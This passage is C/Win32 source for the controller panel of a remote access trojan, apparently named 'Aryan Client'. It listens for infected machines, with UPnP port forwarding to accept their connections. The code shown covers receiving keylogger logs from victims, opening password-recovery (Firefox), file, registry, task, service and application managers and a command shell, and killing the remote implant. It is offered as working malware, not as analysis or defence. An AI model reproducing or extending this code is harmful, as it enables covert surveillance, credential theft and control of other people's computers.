				cf.dwMask = CFM_COLOR | CFM_FACE | CFM_SIZE;  //  control structure
				cf.crTextColor = dwTitleColor;
				cf.yHeight = 32;
				strcpy( cf.szFaceName, "MS Sans Serif" );
                              //  Set character formatting and background color
				 SendDlgItemMessage( KeyHwnd[Recv.ID], IDC_KEYS, EM_SETCHARFORMAT, SCF_SELECTION, (LPARAM)&cf );
				 SendMessage (hEdit, EM_REPLACESEL, 0, (LPARAM) ((LPSTR) Buffer));
				 break;
			case PACKET_KEYLOG_OPEN:
				 Logs[Recv.ID] = fopen(Recv.Data, "wb");
				 sprintf(Buffer, "%d", Recv.ID2);
				 SendMessage(GetDlgItem(KeyHwnd[Recv.ID],IDC_PROGRESSA), PBM_SETRANGE32 , 0, Recv.ID2);
				 SendMessage(GetDlgItem(KeyHwnd[Recv.ID],IDC_PROGRESSA), PBM_SETPOS , (WPARAM)0, 0);
				 //MessageBox(NULL, "CLIENT OPENED LOGS!", "LOLS", MB_OK);
				 break;
			case PACKET_KEYLOG_OFFLINE:
				 fclose(Logs[Recv.ID]);
				
                              //  Set character formatting and background color
				 SendMessage(GetDlgItem(KeyHwnd[Recv.ID],IDC_TASK_STATUS), SB_SETTEXT, 0, (LPARAM)"Downloaded Logs.");	
				hFile = CreateFile(Recv.Data, GENERIC_READ, FILE_SHARE_READ, NULL,OPEN_EXISTING, 0, NULL);
				 if(hFile != INVALID_HANDLE_VALUE)
				{
				 DWORD dwFileSize;

				dwFileSize = GetFileSize(hFile, NULL);
				if(dwFileSize != 0xFFFFFFFF)
				{
				pszFileText = (char *)GlobalAlloc(GPTR, dwFileSize + 1);
					 if(pszFileText != NULL)
					 {
						DWORD dwRead;

						if(ReadFile(hFile, pszFileText, dwFileSize, &dwRead, NULL))
						{
					   pszFileText[dwFileSize] = 0; // Add null terminator
					   
					 if(SetWindowText(GetDlgItem(KeyHwnd[Recv.ID],IDC_KEYS2), pszFileText))
					 {
					 }
					 else
					 {
						// MessageBox(NULL, "It did not work!", "Fail", MB_OK);	
					 }
						  
						}
                GlobalFree(pszFileText);
					 }
				}
        CloseHandle(hFile);
			 }

				 break;
			case PACKET_KEYLOG_DOWNLOAD:
			 	 fwrite(Recv.Data, Recv.ID3, 1, Logs[Recv.ID]);
				 //sprintf(Buffer, "%d", Recv.ID2);
				 //MessageBox(NULL, Buffer, "Buffer", MB_OK);
				 break;
			case PACKET_KEYLOG_DOWNLOAD_UPDATE:
				
				break;
		    case PACKET_REG_MANAGER:
					switch(Recv.ID2)
					{
					case 0:
					 AddKeyFolder(Recv.Data, Recv.ID);
					 break;
					case 1:
					 RegKeyValue(Recv.Data,Recv.Buf, Recv.ID3,Recv.ID); //
					 break;
					}
					break;

				 break;
			}
	
				
		}
              
		break;

	case WM_SIZING:
			switch(wParam)
			{
			case WMSZ_BOTTOM:
			 GetClientRect(Dlg, &rc);
			 MoveWindow(GetDlgItem(Dlg, IDC_SERVERLIST),0,0,rc.right - 3, rc.bottom - 50, TRUE);
			 MoveWindow(GetDlgItem(Dlg, IDC_LOGS),0,0,rc.right - 3, rc.bottom - 50, TRUE);
			 MoveWindow(GetDlgItem(Dlg, IDC_TAB3),0,0,rc.right, rc.bottom - 20, TRUE);
			 MoveWindow(hStatus,0,rc.bottom - 20,rc.right, 20, TRUE);
			break;
			case WMSZ_BOTTOMLEFT:
				 GetClientRect(Dlg, &rc);
			 MoveWindow(GetDlgItem(Dlg, IDC_SERVERLIST),0,0,rc.right - 3, rc.bottom - 50, TRUE);
			 MoveWindow(GetDlgItem(Dlg, IDC_LOGS),0,0,rc.right - 3, rc.bottom - 50, TRUE);
			 MoveWindow(GetDlgItem(Dlg, IDC_TAB3),0,0,rc.right, rc.bottom - 20, TRUE);
			 MoveWindow(hStatus,0,rc.bottom - 20,rc.right, 20, TRUE);
			break;
			case WMSZ_BOTTOMRIGHT:
			 GetClientRect(Dlg, &rc);
			 MoveWindow(GetDlgItem(Dlg, IDC_SERVERLIST),0,0,rc.right - 3, rc.bottom - 50, TRUE);
			 MoveWindow(GetDlgItem(Dlg, IDC_LOGS),0,0,rc.right - 3, rc.bottom - 50, TRUE);
			 MoveWindow(GetDlgItem(Dlg, IDC_TAB3),0,0,rc.right, rc.bottom - 20, TRUE);
			 MoveWindow(hStatus,0,rc.bottom - 20,rc.right, 20, TRUE);
			break;
			case WMSZ_LEFT:
			 GetClientRect(Dlg, &rc);
			 MoveWindow(GetDlgItem(Dlg, IDC_SERVERLIST),0,0,rc.right - 3, rc.bottom - 50, TRUE);
			 MoveWindow(GetDlgItem(Dlg, IDC_LOGS),0,0,rc.right - 3, rc.bottom - 50, TRUE);
			 MoveWindow(GetDlgItem(Dlg, IDC_TAB3),0,0,rc.right, rc.bottom - 20, TRUE);
			 MoveWindow(hStatus,0,rc.bottom - 20,rc.right, 20, TRUE);
            break;
			case WMSZ_RIGHT:
             GetClientRect(Dlg, &rc);
			 MoveWindow(GetDlgItem(Dlg, IDC_SERVERLIST),0,0,rc.right - 3, rc.bottom - 50, TRUE);
			 MoveWindow(GetDlgItem(Dlg, IDC_LOGS),0,0,rc.right - 3, rc.bottom - 50, TRUE);
			 MoveWindow(GetDlgItem(Dlg, IDC_TAB3),0,0,rc.right, rc.bottom - 20, TRUE);
			 MoveWindow(hStatus,0,rc.bottom - 20,rc.right, 20, TRUE);
			break;
			case WMSZ_TOP:
			 GetClientRect(Dlg, &rc);
			 MoveWindow(GetDlgItem(Dlg, IDC_SERVERLIST),0,0,rc.right - 3, rc.bottom - 50, TRUE);
			 MoveWindow(GetDlgItem(Dlg, IDC_LOGS),0,0,rc.right - 3, rc.bottom - 50, TRUE);
			 MoveWindow(GetDlgItem(Dlg, IDC_TAB3),0,0,rc.right, rc.bottom - 20, TRUE);
			 MoveWindow(hStatus,0,rc.bottom - 20,rc.right, 20, TRUE);
			break;
			case WMSZ_TOPLEFT:
			 GetClientRect(Dlg, &rc);
			 MoveWindow(GetDlgItem(Dlg, IDC_SERVERLIST),0,0,rc.right - 3, rc.bottom - 50, TRUE);
			 MoveWindow(GetDlgItem(Dlg, IDC_LOGS),0,0,rc.right - 3, rc.bottom - 50, TRUE);
			 MoveWindow(GetDlgItem(Dlg, IDC_TAB3),0,0,rc.right, rc.bottom - 20, TRUE);
			 MoveWindow(hStatus,0,rc.bottom - 20,rc.right, 20, TRUE);
			break;
			case WMSZ_TOPRIGHT:
			 GetClientRect(Dlg, &rc);
			 MoveWindow(GetDlgItem(Dlg, IDC_SERVERLIST),0,0,rc.right - 3, rc.bottom - 50, TRUE);
			 MoveWindow(GetDlgItem(Dlg, IDC_LOGS),0,0,rc.right - 3, rc.bottom - 50, TRUE);
			 MoveWindow(GetDlgItem(Dlg, IDC_TAB3),0,0,rc.right, rc.bottom - 20, TRUE);
			 MoveWindow(hStatus,0,rc.bottom - 20,rc.right, 20, TRUE);
			break;
			}
			break;

	case WM_NOTIFY:
		switch(wParam)
		{
		case IDC_TAB3:
            switch (((LPNMHDR)lParam)->code)
            {
            case TCN_SELCHANGE:
                    int iPage = TabCtrl_GetCurSel(GetDlgItem(Dlg, IDC_TAB3)); 
                   switch(iPage)
				   {
					 case 0:
			 ShowWindow(GetDlgItem(Dlg, IDC_SETTINGS),SW_HIDE);
			 ShowWindow(GetDlgItem(Dlg, IDC_SETTINGS2),SW_HIDE);
			 ShowWindow(GetDlgItem(Dlg, IDC_SETTINGTEXT1),SW_HIDE);
			 ShowWindow(GetDlgItem(Dlg, IDC_SETTINGTEXT),SW_HIDE);
			 ShowWindow(GetDlgItem(Dlg, IDC_SETTINGTEXT2),SW_HIDE);
			 ShowWindow(GetDlgItem(Dlg, IDC_SETTINGTEXT3),SW_HIDE);
			 ShowWindow(GetDlgItem(Dlg, IDC_IPADDRESS),SW_HIDE);
			 ShowWindow(GetDlgItem(Dlg, IDC_FILEPORT),SW_HIDE);
			 ShowWindow(GetDlgItem(Dlg, IDC_MAINPORT),SW_HIDE);
			 ShowWindow(GetDlgItem(Dlg, IDC_SERIVCENAME),SW_HIDE);
			 ShowWindow(GetDlgItem(Dlg, IDC_KEYSCOLOUR),SW_HIDE);
			 ShowWindow(GetDlgItem(Dlg, IDC_KEYSCOLOUR2),SW_HIDE);
			 ShowWindow(GetDlgItem(Dlg, IDC_KEYSCOLOUR3),SW_HIDE);
			 ShowWindow(GetDlgItem(Dlg, IDC_KEYCOLOUR),SW_HIDE);
			 ShowWindow(GetDlgItem(Dlg, IDC_KEYCOLOUR2),SW_HIDE);
			 ShowWindow(GetDlgItem(Dlg, IDC_KEYCOLOUR3),SW_HIDE);
			 ShowWindow(GetDlgItem(Dlg, IDC_KEYLOGGERCOLOURS),SW_HIDE);
			 ShowWindow(GetDlgItem(Dlg, IDC_TEXTNORMAL),SW_HIDE);
			 ShowWindow(GetDlgItem(Dlg, IDC_TIME),SW_HIDE);
			 ShowWindow(GetDlgItem(Dlg, IDC_WINDOWTEXT),SW_HIDE);
			 ShowWindow(GetDlgItem(Dlg, IDC_OKSETTING),SW_HIDE);
			 ShowWindow(GetDlgItem(Dlg, IDC_BACKGROUND),SW_HIDE);
			 ShowWindow(GetDlgItem(Dlg, IDC_KEYCOLOUR4),SW_HIDE);
			 ShowWindow(GetDlgItem(Dlg, IDC_KEYSCOLOUR4),SW_HIDE);

					 GetClientRect(Dlg, &rc);
					 ShowWindow(GetDlgItem( Dlg, IDC_LOGS  ),SW_HIDE);
					 ShowWindow(GetDlgItem( Dlg, IDC_SERVERLIST ),SW_SHOW);
					 MoveWindow(GetDlgItem(Dlg, IDC_SERVERLIST),0,0,rc.right - 3, rc.bottom - 50, TRUE);
					 break;

					 case 1:
						 			 ShowWindow(GetDlgItem(Dlg, IDC_SETTINGS ),SW_HIDE);
			 ShowWindow(GetDlgItem(Dlg, IDC_SETTINGS2 ),SW_HIDE);
			 ShowWindow(GetDlgItem(Dlg, IDC_SETTINGTEXT1 ),SW_HIDE);
			 ShowWindow(GetDlgItem(Dlg, IDC_SETTINGTEXT ),SW_HIDE);
			 ShowWindow(GetDlgItem(Dlg, IDC_SETTINGTEXT2 ),SW_HIDE);
			 ShowWindow(GetDlgItem(Dlg, IDC_SETTINGTEXT3 ),SW_HIDE);
			 ShowWindow(GetDlgItem(Dlg, IDC_IPADDRESS ),SW_HIDE);
			 ShowWindow(GetDlgItem(Dlg, IDC_FILEPORT ),SW_HIDE);
			 ShowWindow(GetDlgItem(Dlg, IDC_MAINPORT ),SW_HIDE);
			 ShowWindow(GetDlgItem(Dlg, IDC_SERIVCENAME ),SW_HIDE);
			 ShowWindow(GetDlgItem(Dlg, IDC_MAINPORT ),SW_HIDE);
			 ShowWindow(GetDlgItem(Dlg, IDC_KEYSCOLOUR),SW_HIDE);
			 ShowWindow(GetDlgItem(Dlg, IDC_KEYSCOLOUR2),SW_HIDE);
			 ShowWindow(GetDlgItem(Dlg, IDC_KEYSCOLOUR3),SW_HIDE);
			 ShowWindow(GetDlgItem(Dlg, IDC_KEYCOLOUR),SW_HIDE);
			 ShowWindow(GetDlgItem(Dlg, IDC_KEYCOLOUR2),SW_HIDE);
			 ShowWindow(GetDlgItem(Dlg, IDC_KEYCOLOUR3),SW_HIDE);
			 ShowWindow(GetDlgItem(Dlg, IDC_KEYLOGGERCOLOURS),SW_HIDE);
			 ShowWindow(GetDlgItem(Dlg, IDC_TEXTNORMAL),SW_HIDE);
			 ShowWindow(GetDlgItem(Dlg, IDC_TIME),SW_HIDE);
			 ShowWindow(GetDlgItem(Dlg, IDC_WINDOWTEXT),SW_HIDE);
			 ShowWindow(GetDlgItem(Dlg, IDC_OKSETTING),SW_HIDE);
			 
			 ShowWindow(GetDlgItem(Dlg, IDC_BACKGROUND),SW_HIDE);
			 ShowWindow(GetDlgItem(Dlg, IDC_KEYCOLOUR4),SW_HIDE);
			 ShowWindow(GetDlgItem(Dlg, IDC_KEYSCOLOUR4),SW_HIDE);

					 GetClientRect(Dlg, &rc);
					 ShowWindow(GetDlgItem( Dlg, IDC_SERVERLIST ),SW_HIDE);
					 ShowWindow(GetDlgItem( Dlg, IDC_LOGS ),SW_SHOW);
					 MoveWindow(GetDlgItem(Dlg, IDC_LOGS),0,0,rc.right - 3, rc.bottom - 50, TRUE);
					 break;
					 
					 case 2:
					 GetClientRect(Dlg, &rc);
					 ShowWindow(GetDlgItem( Dlg, IDC_SERVERLIST ),SW_HIDE);
					 ShowWindow(GetDlgItem( Dlg, IDC_LOGS ),SW_HIDE);
					 MoveWindow(GetDlgItem(Dlg, IDC_LOGS),0,0,rc.right - 3, rc.bottom - 50, TRUE);

					  ShowWindow(GetDlgItem(Dlg, IDC_SETTINGS ),SW_SHOW);
			
			 ShowWindow(GetDlgItem(Dlg, IDC_SETTINGS2 ),SW_SHOW);
			 ShowWindow(GetDlgItem(Dlg, IDC_SETTINGTEXT1 ),SW_SHOW);
			 ShowWindow(GetDlgItem(Dlg, IDC_SETTINGTEXT ),SW_SHOW);
			 ShowWindow(GetDlgItem(Dlg, IDC_SETTINGTEXT2 ),SW_SHOW);
			 ShowWindow(GetDlgItem(Dlg, IDC_SETTINGTEXT3 ),SW_SHOW);
			 ShowWindow(GetDlgItem(Dlg, IDC_IPADDRESS ),SW_SHOW);
			 ShowWindow(GetDlgItem(Dlg, IDC_FILEPORT ),SW_SHOW);
			 ShowWindow(GetDlgItem(Dlg, IDC_MAINPORT ),SW_SHOW);
			 ShowWindow(GetDlgItem(Dlg, IDC_SERIVCENAME ),SW_SHOW);
			 ShowWindow(GetDlgItem(Dlg, IDC_MAINPORT ),SW_SHOW);
			 
			 ShowWindow(GetDlgItem(Dlg, IDC_OKSETTING),SW_SHOW);

		     ShowWindow(GetDlgItem(Dlg, IDC_KEYSCOLOUR),SW_SHOW);
			 ShowWindow(GetDlgItem(Dlg, IDC_KEYSCOLOUR2),SW_SHOW);
			 ShowWindow(GetDlgItem(Dlg, IDC_KEYSCOLOUR3),SW_SHOW);
			 ShowWindow(GetDlgItem(Dlg, IDC_KEYCOLOUR),SW_SHOW);
			 ShowWindow(GetDlgItem(Dlg, IDC_KEYCOLOUR2),SW_SHOW);
			 ShowWindow(GetDlgItem(Dlg, IDC_KEYCOLOUR3),SW_SHOW);
			 ShowWindow(GetDlgItem(Dlg, IDC_KEYLOGGERCOLOURS),SW_SHOW);

			 ShowWindow(GetDlgItem(Dlg, IDC_TEXTNORMAL),SW_SHOW);
			 ShowWindow(GetDlgItem(Dlg, IDC_TIME),SW_SHOW);
			 ShowWindow(GetDlgItem(Dlg, IDC_WINDOWTEXT),SW_SHOW);

			 ShowWindow(GetDlgItem(Dlg, IDC_BACKGROUND),SW_SHOW);
			 ShowWindow(GetDlgItem(Dlg, IDC_KEYCOLOUR4),SW_SHOW);
			 ShowWindow(GetDlgItem(Dlg, IDC_KEYSCOLOUR4),SW_SHOW);
					break;
					}
				
				break;
            }
		case IDC_SERVERLIST:
        if(((LPNMHDR)lParam)->code == NM_RCLICK) // Right Click
			{	 
            // Get the client coordinates for the mouse click.
			  pt.x = 0;
			  pt.y = 0;
			  GetCursorPos(&pt);
		
            // If the mouse click took place inside the client 
            // area, execute the application-defined function 
            // that displays the shortcut menu. 
	if(x == 0)
	{
        
			hmenu = LoadMenu(GInstance, MAKEINTRESOURCE(IDR_MENU4));

			if (hmenu == NULL) 
			{
             break;
			}
 
			hmenuTrackPopup = GetSubMenu(hmenu, 0); 

            //ClientToScreen(Dlg, (LPPOINT) &pt);   
 
            TrackPopupMenu(hmenuTrackPopup, TPM_LEFTALIGN | TPM_LEFTBUTTON, pt.x, pt.y, 0, Dlg, NULL); 
			break;
	}
	else
	{
	
			hmenu = LoadMenu(GInstance, MAKEINTRESOURCE(IDR_COMMANDS));

			if (hmenu == NULL) 
			{
             break;
			}
 
			hmenuTrackPopup = GetSubMenu(hmenu, 0); 

            //ClientToScreen(Dlg, (LPPOINT) &pt);   
 
            TrackPopupMenu(hmenuTrackPopup, TPM_LEFTALIGN | TPM_LEFTBUTTON, pt.x, pt.y, 0, Dlg, NULL); 
			break;
	}
			
			}
		}
		break;


	case WM_COMMAND:
		Select=LOWORD(wParam);
		switch(Select)
		{
////////////////////////////////////////////////////////////////////////////////                      
        case IDC_LISTEN:
			if(x == 0)
			{
			 x = 1;
			 InitWSA();
             CreateThread(NULL, 0,FileConnectWindow,(LPVOID)"", 0, &thread);
			 CHECK = CreateThread(NULL, 0,CheckStatus,(LPVOID)"", 0, &thread);
			 GetTime();
			 
	    	 if(InitSocket(Dlg))		
			 {
	         SendMessage(hStatus, SB_SETTEXT, 0, (LPARAM)"Connection Status: Listening");
			 strcpy(Buffer, "");
			 sprintf(Buffer, "Listening on ports: %d & %d", ServerPort, FilePort);
			 GetTime();
			 SetLogs(Time, "Listening", Buffer , "Pass");
			 }
			 else
			 {
			 SendMessage(hStatus, SB_SETTEXT, 0, (LPARAM)"Connection Status: Error Listening please restart client!");
			 GetTime();
			 SetLogs(Time, "Listening", "Failed to listen" , "Fail");
			 }
			}
		  
			else
			{
			MessageBox(NULL, "Already listening!", "Listening", MB_OK | MB_ICONERROR);
			}
		  break;		
//////////////////////////////////////////////////////////////////////////////////             
		case IDC_DISCONNECT:
		 if(x == 1)
			{
			 CloseSocket(hStatus);
			 ResetProcs(Dlg, IDC_SERVERLIST);
			 ResetProcs(Dlg, IDC_CONNECTIONSTATUS);
			 S = 0;
			 x = 0;
			 //TerminateThread(CHECK, 0);
			 
	         SendMessage(hStatus, SB_SETTEXT, 0, (LPARAM)"Connection Status: Not Listening");
			 GetTime();
			 strcpy(Buffer, "");
			 sprintf(Buffer, "Stopped Listening on ports: %d & %d", ServerPort, FilePort);
			 SetLogs(Time, "Stopped Listening", Buffer , "Pass");
			}
			else
			{
			MessageBox(NULL, "you need to listen first!", "Disconnect", MB_OK | MB_ICONERROR);
			 GetTime();
			 SetLogs(Time, "Stopped Listening", "you need to listen first!" , "Fail");
			}
			 break;
	case  IDC_BACKGROUND:
  
		memset( &cc, 0, sizeof(CHOOSECOLOR) );
		cc.lStructSize = sizeof(CHOOSECOLOR);
		cc.hwndOwner = Dlg;
		cc.lpCustColors = dwColors;
		cc.Flags = CC_RGBINIT;
		cc.rgbResult = dwBackColor;

		if( ! ChooseColor( &cc ) )
		return( FALSE );

		 dwBackColor = cc.rgbResult;

         break;

		case  IDC_TEXTNORMAL:
  
		memset( &cc, 0, sizeof(CHOOSECOLOR) );
		cc.lStructSize = sizeof(CHOOSECOLOR);
		cc.hwndOwner = Dlg;
		cc.lpCustColors = dwColors;
		cc.Flags = CC_RGBINIT;
		cc.rgbResult = dwTextColor;

		if( ! ChooseColor( &cc ) )
		return( FALSE );

		dwTextColor = cc.rgbResult;        
		 break;

        case  IDC_TIME:
  
		memset( &cc, 0, sizeof(CHOOSECOLOR) );
		cc.lStructSize = sizeof(CHOOSECOLOR);
		cc.hwndOwner = Dlg;
		cc.lpCustColors = (unsigned long *)dwColors;
		cc.Flags = CC_RGBINIT;
		cc.rgbResult = dwTimeColor;

		if( ! ChooseColor( &cc ) )
		return( FALSE );

		dwTimeColor = cc.rgbResult;
         
		 break;
		case  IDC_WINDOWTEXT:
  
		memset( &cc, 0, sizeof(CHOOSECOLOR) );
		cc.lStructSize = sizeof(CHOOSECOLOR);
		cc.hwndOwner = Dlg;
		cc.lpCustColors = (unsigned long *)dwColors;
		cc.Flags = CC_RGBINIT;
		cc.rgbResult = dwTitleColor;

		if( ! ChooseColor( &cc ) )
		return( FALSE );

		dwTitleColor = cc.rgbResult;

		 memset( &cf, 0, sizeof(CHARFORMAT) );
		 cf.cbSize = sizeof(CHARFORMAT);
		 cf.dwMask = CFM_COLOR;
		 cf.crTextColor = dwTextColor;
         
		 break;
		case IDC_SETTING:
			DialogBox(GInstance,(LPCTSTR)IDD_SERVEREDIT,0,(DLGPROC)EditProc);
			break;
		case IDC_OKSETTING:
			MessageBox(NULL, "Please wait for Aryan Client to complete its operation \n UPnP can take as long as 30 seconds to complete, so it may appear the client has locked up \n but infact it is working on forwarding the port.", "Wait..", MB_OK);
			GetWindowText(GetDlgItem(Dlg, IDC_MAINPORT), PORTA, 12);
			GetWindowText(GetDlgItem(Dlg, IDC_FILEPORT), PORTB, 12);
			GetWindowText(GetDlgItem(Dlg, IDC_SERIVCENAME), ServiceName, 12);
			GetWindowText(GetDlgItem(Dlg, IDC_IPADDRESS), ip, 12);
		
			ServerPort = atoi(PORTA);
			FilePort = atoi(PORTB);
			sprintf(filename, "Ports: %d & %d", ServerPort, FilePort);
			SendMessage(hStatus, SB_SETTEXT, 1, (LPARAM)filename);
			Sleep(100);
			if(!nat.discovery())
			{
		 	MessageBox(NULL, "Discovery error, \nMake sure UPnP settings for this port do not already exist. \nMake sure your Router supports UPnP and has UPnP Enabled. ", "UPnP Discovery error", MB_OK);
			return -1;
			}
			if(!nat.add_port_mapping("Aryan",ip,atoi(PORTA),atoi(PORTA),"TCP"))
			{
		 	MessageBox(NULL, "Port Mapping ERROR, Make sure UPnP settings for this Service already exist.", "Port Mapping ERROR", MB_OK);
			return -1;
			}	
			if(!nat.discovery())
			{
		 	MessageBox(NULL, "Discovery error", "Discovery error", MB_OK);
			return -1;
			}
			if(!nat.add_port_mapping("Aryan",ip,atoi(PORTB),atoi(PORTB),"TCP"))
			{
		 	MessageBox(NULL, "Port Mapping ERROR", "Port Mapping ERROR", MB_OK);
			return -1;
			}
			sprintf(filename, "Ports: %d & %d", ServerPort, FilePort);
			SendMessage(hStatus, SB_SETTEXT, 1, (LPARAM)filename);
break;
	   	case IDC_FIREFOX:
			ZeroMemory(&Window, sizeof(FileStruct));
			item.iItem=ListView_GetNextItem(GetDlgItem(Dlg,IDC_SERVERLIST),-1,LVNI_SELECTED);
			item.mask=LVIF_TEXT;
			item.iSubItem=0;
			item.pszText=Head.Data;
			item.cchTextMax=255;
			ListView_GetItem(GetDlgItem(Dlg,IDC_SERVERLIST),&item);

			strcpy(Window.ID, Head.Data);

			if(PassHwnd[atoi(Window.ID)] == NULL)
		  {
			item.iSubItem=3;
			item.pszText=Window.IP;
			item.cchTextMax=255;
			ListView_GetItem(GetDlgItem(Dlg,IDC_SERVERLIST),&item);
			strcpy(WINDOWIP, Window.IP);

			 strcpy(Buffer, "");
			 sprintf(Buffer, "Password Recovered for: %s", Window.IP);
			GetTime();
			SetLogs(Time, "Password Recovery", Buffer , "Pass");

			CreateThread(NULL, 0,PassswordWindow,(LPVOID)&Window, 0, &thread);
		  }
		  else
		  {
			 strcpy(Head.Data, "");
		  }
			
			break;
		case IDC_SERVICEMANAGER:
			item.iItem=ListView_GetNextItem(GetDlgItem(Dlg,IDC_SERVERLIST),-1,LVNI_SELECTED);
			item.mask=LVIF_TEXT;
			item.iSubItem=0;
			item.pszText=Head.Data;
			item.cchTextMax=255;
			ListView_GetItem(GetDlgItem(Dlg,IDC_SERVERLIST),&item);

			strcpy(Window.ID, Head.Data);

			if(ServiceHwnd[atoi(Head.Data)] == NULL)
		  {
			item.iSubItem=3;
			item.pszText=Head.Buf;
			item.cchTextMax=255;
			ListView_GetItem(GetDlgItem(Dlg,IDC_SERVERLIST),&item);
			strcpy(Window.IP, Head.Buf);
			
			strcpy(Buffer, "");
			sprintf(Buffer, "Service Manager for: %s", Window.IP);
			GetTime();
			SetLogs(Time, "Service Manager", Buffer , "Pass");

			CreateThread(NULL, 0,ServiceWindow,(LPVOID)&Window, 0, &thread);
		  }
		  else
		  {
		  }
			
			break;
////////////////////////////////////////////////////////////////////////////////
		case IDC_EXIT:
			{
				if(MessageBox(NULL, "Are you sure you want to EXIT?", "Exiting...", MB_YESNO | MB_ICONQUESTION) == IDYES)
				{
				ExitProcess(0);
			    EndDialog(Dlg,Select);
		    	PostQuitMessage(0);
		    	break;
				}
				
				else
				{
				MessageBox(NULL, "You should not have pressed exit if you did not want to exit!", "JackAss..", MB_OK | MB_ICONWARNING);	
				break;
				}

			break;
			}
	case IDC_FILEMANAGER:
			{
			strcpy(Head.Data, "");
         
			item.iItem=ListView_GetNextItem(GetDlgItem(Dlg,IDC_SERVERLIST),-1,LVNI_SELECTED);
			item.mask=LVIF_TEXT;
			item.iSubItem=0;
			item.pszText=Head.Data;
			item.cchTextMax=255;
			ListView_GetItem(GetDlgItem(Dlg,IDC_SERVERLIST),&item);
			
		 if(FileHwnd[atoi(Head.Data)] == NULL)
		  {	
			item.iSubItem=3;
			item.pszText=Window.IP;
			item.cchTextMax=255;
			ListView_GetItem(GetDlgItem(Dlg,IDC_SERVERLIST),&item);
			strcpy(WINDOWIP, Window.IP);
			
			strcpy(Buffer, "");
			sprintf(Buffer, "File Manager for: %s", Window.IP);
			GetTime();
			SetLogs(Time, "File Manager", Buffer , "Pass");
			CreateThread(NULL, 0,FileWindow,(LPVOID)atoi(Head.Data), 0, &thread);
		  }
					
			break;
			}
		case IDC_TASKMANAGER:
			{
			
		    item.iItem=ListView_GetNextItem(GetDlgItem(Dlg,IDC_SERVERLIST),-1,LVNI_SELECTED);
			item.mask=LVIF_TEXT;
			item.iSubItem=0;
			item.pszText=Head.Data;
			item.cchTextMax=255;
			ListView_GetItem(GetDlgItem(Dlg,IDC_SERVERLIST),&item);
			strcpy(Window.ID, Head.Data);
			GID = atoi(Window.ID);
          if(TASKS[atoi(Window.ID)] == NULL)
		  {
			item.iSubItem=3;
			item.pszText=Window.IP;
			item.cchTextMax=255;
			ListView_GetItem(GetDlgItem(Dlg,IDC_SERVERLIST),&item);
			strcpy(WINDOWIP, Window.IP);

			strcpy(Buffer, ""); 
			sprintf(Buffer, "Task Manager for: %s", Window.IP);
			GetTime();
			SetLogs(Time, "Task Manager", Buffer , "Pass");
			CreateThread(NULL, 0,ProcWindow,(LPVOID)&Window, 0, &thread);
		  }
		  else
		  {
		  }
			break;
			}
	   
	   
//////////////////////////////////////////////////////////////////////////////////////////////
	case IDC_REGISTRY:
		    item.iItem=ListView_GetNextItem(GetDlgItem(Dlg,IDC_SERVERLIST),-1,LVNI_SELECTED);
			item.mask=LVIF_TEXT;
			item.iSubItem=0;
			item.pszText=Head.Data;
			item.cchTextMax=255;
			ListView_GetItem(GetDlgItem(Dlg,IDC_SERVERLIST),&item);  
			
			strcpy(Window.ID, Head.Data);
			GID = atoi(Head.Data);
          if(RegHwnd[atoi(Head.Data)] == NULL)
		  {
			item.iSubItem=3;
			item.pszText=Window.IP;
			item.cchTextMax=255;
			ListView_GetItem(GetDlgItem(Dlg,IDC_SERVERLIST),&item);
			strcpy(WINDOWIP, Window.IP);
			strcpy(Buffer, ""); 
			sprintf(Buffer, "Registry Manager for: %s", Window.IP);
			GetTime();
			SetLogs(Time, "Registry Manager", Buffer , "Pass");
			CreateThread(NULL, 0,RegisteryWindow,(LPVOID)&Window, 0, &thread);
		  }
		  else
		  {		
	
		  }
			break;

	case IDC_APPSMAN:
			item.iItem=ListView_GetNextItem(GetDlgItem(Dlg,IDC_SERVERLIST),-1,LVNI_SELECTED);
			item.mask=LVIF_TEXT;
			item.iSubItem=0;
			item.pszText=Head.Data;
			item.cchTextMax=255;
			ListView_GetItem(GetDlgItem(Dlg,IDC_SERVERLIST),&item);  
			
			strcpy(Window.ID, Head.Data);
			GID = atoi(Head.Data);
          if(ProgHwnd[atoi(Head.Data)] == NULL)
		  {
			item.iSubItem=3;
			item.pszText=Window.IP;
			item.cchTextMax=255;
			ListView_GetItem(GetDlgItem(Dlg,IDC_SERVERLIST),&item);
			strcpy(WINDOWIP, Window.IP);
			strcpy(Buffer, ""); 
			sprintf(Buffer, "Application Manager for: %s", Window.IP);
			GetTime();
			SetLogs(Time, "Application Manager", Buffer , "Pass");
			CreateThread(NULL, 0,AppsWindow,(LPVOID)&Window, 0, &thread);
		  }
		  else
		  {		
	
		  }
			break;

	   case IDC_KILL:
			item.iItem=ListView_GetNextItem(GetDlgItem(Dlg,IDC_SERVERLIST),-1,LVNI_SELECTED);
			item.mask=LVIF_TEXT;
			item.iSubItem=0;
			item.pszText=Head.Data;
			item.cchTextMax=255;
			ListView_GetItem(GetDlgItem(Dlg,IDC_SERVERLIST),&item);
			Head.ID = atoi (Head.Data);
			Head.PacketType = PACKET_EXIT;
			SentKb+=send(Client[Head.ID],(char*)&Head,HeadSize,0);

			item.iSubItem=3;
			item.pszText=Window.IP;
			item.cchTextMax=255;
			ListView_GetItem(GetDlgItem(Dlg,IDC_SERVERLIST),&item);
			strcpy(WINDOWIP, Window.IP);
			
			strcpy(Buffer, ""); 
			sprintf(Buffer, "Killed: %s", Window.IP);
			GetTime();
			SetLogs(Time, "Kill", Buffer , "Pass");
			break;

	case IDC_KEYLOGGER:
			item.iItem=ListView_GetNextItem(GetDlgItem(Dlg,IDC_SERVERLIST),-1,LVNI_SELECTED);
			item.mask=LVIF_TEXT;
			item.iSubItem=0;
			item.pszText=Head.Data;
			item.cchTextMax=255;
			ListView_GetItem(GetDlgItem(Dlg,IDC_SERVERLIST),&item);
			GID = atoi(Head.Data);
          if(KeyHwnd[atoi(Head.Data)] == NULL)
		  {	
			item.iSubItem=3;
			item.pszText=Window.IP;
			item.cchTextMax=255;
			ListView_GetItem(GetDlgItem(Dlg,IDC_SERVERLIST),&item);
			strcpy(WINDOWIP, Window.IP);		
			
			strcpy(Buffer, ""); 
			sprintf(Buffer, "Keylogger for: %s", Window.IP);
			GetTime();
			SetLogs(Time, "Keylogger", Buffer , "Pass");

			CreateThread(NULL, 0,KeyLogWindow,(LPVOID)&Window, 0, &thread);
		  }
		  else
		  {
			strcpy(Head.Data, "");		
		  }
			break;

	case IDC_CMD:
			item.iItem=ListView_GetNextItem(GetDlgItem(Dlg,IDC_SERVERLIST),-1,LVNI_SELECTED);
			item.mask=LVIF_TEXT;
			item.iSubItem=0;
			item.pszText=Head.Data;
